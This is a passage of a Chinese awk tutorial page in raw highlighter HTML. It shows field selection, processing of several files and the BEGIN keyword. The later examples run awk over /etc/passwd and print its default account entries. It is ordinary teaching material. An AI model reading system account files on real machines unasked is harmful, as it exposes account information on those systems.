class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '{print $(NF - 1)}' fruit.txt\r\n1997\r\n1986\r\n1990\r\n2008</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afa7679060798-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afa7679060798-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afa7679060798-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afa7679060798-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afa7679060798-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afa7679060798-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{print $(NF - 1)}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fruit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afa7679060798-2\"><span class=\"crayon-cn\">1997</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afa7679060798-3\"><span class=\"crayon-cn\">1986</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afa7679060798-4\"><span class=\"crayon-cn\">1990</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afa7679060798-5\"><span class=\"crayon-cn\">2008</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>上面 <code>$(NF-1)</code> 表示倒数第 2 列， <code>$(NF-2)</code> 表示倒数第 3 列，依次类推。</p>\n<p><strong>现在除了刚才说的有一个 fruit.txt 文件之外，我们又多了一个新文件叫 company.txt 内容如下</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afab389947873\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nyahoo   100 4500\r\ngoogle  150 7500\r\napple   180 8000\r\ntwitter 120 5000</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afab389947873-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afab389947873-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afab389947873-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afab389947873-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afab389947873-1\"><span class=\"crayon-i\">yahoo</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4500</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afab389947873-2\"><span class=\"crayon-i\">google</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">150</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7500</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afab389947873-3\"><span class=\"crayon-i\">apple</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">180</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8000</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afab389947873-4\"><span class=\"crayon-i\">twitter</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">120</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5000</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p><strong>我们用 fruit.txt 和 company.txt 两个文件来向你演示 awk 同时处理多个文件的时候有什么效果</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afae172357931\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '{print FILENAME \"\\t\" $0}' fruit.txt company.txt\r\nfruit.txt       peach    100   Mar  1997   China\r\nfruit.txt       Lemon    150   Jan  1986   America\r\nfruit.txt       Pear     240   Mar  1990   Janpan\r\nfruit.txt       avocado  120   Feb  2008   china\r\ncompany.txt     yahoo   100 4500\r\ncompany.txt     google  150 7500\r\ncompany.txt     apple   180 8000\r\ncompany.txt     twitter 120 5000</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afae172357931-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afae172357931-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afae172357931-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afae172357931-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afae172357931-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afae172357931-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afae172357931-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afae172357931-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afae172357931-9\">9</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afae172357931-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'{print FILENAME \"\\t\" $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">fruit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt </span><span class=\"crayon-v\">company</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afae172357931-2\"><span class=\"crayon-v\">fruit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt       </span><span class=\"crayon-i\">peach</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Mar</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1997</span><span class=\"crayon-h\">   </span><span class=\"crayon-e\">China</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afae172357931-3\"><span class=\"crayon-v\">fruit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt       </span><span class=\"crayon-i\">Lemon</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">150</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Jan</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1986</span><span class=\"crayon-h\">   </span><span class=\"crayon-e\">America</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afae172357931-4\"><span class=\"crayon-v\">fruit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt       </span><span class=\"crayon-i\">Pear</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">240</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Mar</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1990</span><span class=\"crayon-h\">   </span><span class=\"crayon-e\">Janpan</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afae172357931-5\"><span class=\"crayon-v\">fruit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt       </span><span class=\"crayon-i\">avocado</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">120</span><span class=\"crayon-h\">   </span><span class=\"crayon-i\">Feb</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2008</span><span class=\"crayon-h\">   </span><span class=\"crayon-e\">china</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afae172357931-6\"><span class=\"crayon-v\">company</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt     </span><span class=\"crayon-i\">yahoo</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">100</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4500</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afae172357931-7\"><span class=\"crayon-v\">company</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt     </span><span class=\"crayon-i\">google</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">150</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7500</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afae172357931-8\"><span class=\"crayon-v\">company</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt     </span><span class=\"crayon-i\">apple</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">180</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8000</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afae172357931-9\"><span class=\"crayon-v\">company</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt     </span><span class=\"crayon-i\">twitter</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">120</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5000</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0022 seconds] -->\r\n<p>当你使用 awk 同时处理多个文件的时候，它会将多个文件合并处理，变量 <code>FILENAME</code> 就表示当前文本行所在的文件名称。</p>\n<p>看到这里是不是感觉 awk 命令的使用方法真的是简单到爆炸，现在不要太高兴，请举起你的双手跟我一起摇摆。。。哦，不对！请拿起你的双手在电脑上试一试上面这些例子。 你会知道我没有骗你，因为讲了这么多，傻子都会了。。。—_—</p>\n<p><strong>BEGIN 关键字的使用</strong></p>\n<p>在脚本代码段前面使用 BEGIN 关键字时，它会在开始读取一个文件之前，运行一次 BEGIN 关键字后面的脚本代码段， BEGIN 后面的脚本代码段只会执行一次，执行完之后 awk 程序就会退出</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afb1183215484\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk 'BEGIN {print \"Start read file\"}' /etc/passwd\r\nStart read file</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afb1183215484-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afb1183215484-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afb1183215484-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'BEGIN {print \"Start read file\"}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">passwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afb1183215484-2\"><span class=\"crayon-e\">Start </span><span class=\"crayon-e\">read </span><span class=\"crayon-v\">file</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>awk 脚本中可以用多个花括号来执行多个脚本代码，就像下面这样</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afb5226871602\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk 'BEGIN {print \"Start read file\"} {print $0}' /etc/passwd\r\nStart read file\r\nroot:x:0:0:root:/root:/bin/bash\r\nbin:x:1:1:bin:/bin:/sbin/nologin\r\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin\r\nadm:x:3:4:adm:/var/adm:/sbin/nologin\r\nlp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\r\nsync:x:5:0:sync:/sbin:/bin/sync\r\nshutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\r\nhalt:x:7:0:halt:/sbin:/sbin/halt\r\nmail:x:8:12:mail:/var/spool/mail:/sbin/nologin\r\noperator:x:11:0:operator:/root:/sbin/nologin\r\ngames:x:12:100:games:/usr/games:/sbin/nologin\r\nftp:x:14:50:FTP User:/var/ftp:/sbin/nologin\r\nnobody:x:99:99:Nobody:/:/sbin/nologin</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afb5226871602-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afb5226871602-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afb5226871602-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afb5226871602-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afb5226871602-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afb5226871602-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afb5226871602-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afb5226871602-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afb5226871602-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afb5226871602-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afb5226871602-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afb5226871602-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afb5226871602-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afb5226871602-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afb5226871602-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afb5226871602-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'BEGIN {print \"Start read file\"} {print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">passwd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afb5226871602-2\"><span class=\"crayon-e\">Start </span><span class=\"crayon-e\">read </span><span class=\"crayon-e\">file</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afb5226871602-3\"><span class=\"crayon-v\">root</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">root</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">root</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">bash</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afb5226871602-4\"><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afb5226871602-5\"><span class=\"crayon-v\">daemon</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">daemon</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afb5226871602-6\"><span class=\"crayon-v\">adm</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">3</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">adm</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">adm</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afb5226871602-7\"><span class=\"crayon-v\">lp</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">4</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">7</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">lp</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">spool</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lpd</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">nologin</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afb5226871602-8\"><span class=\"crayon-v\">sync</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">5</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">sync</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">sync</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afb5226871602-9\"><span class=\"crayon-v\">shutdown</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">6</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">shutdown</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">shutdown</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afb5226871602-10\"><span class=\"crayon-v\">halt</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">x</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">7</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">halt</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span 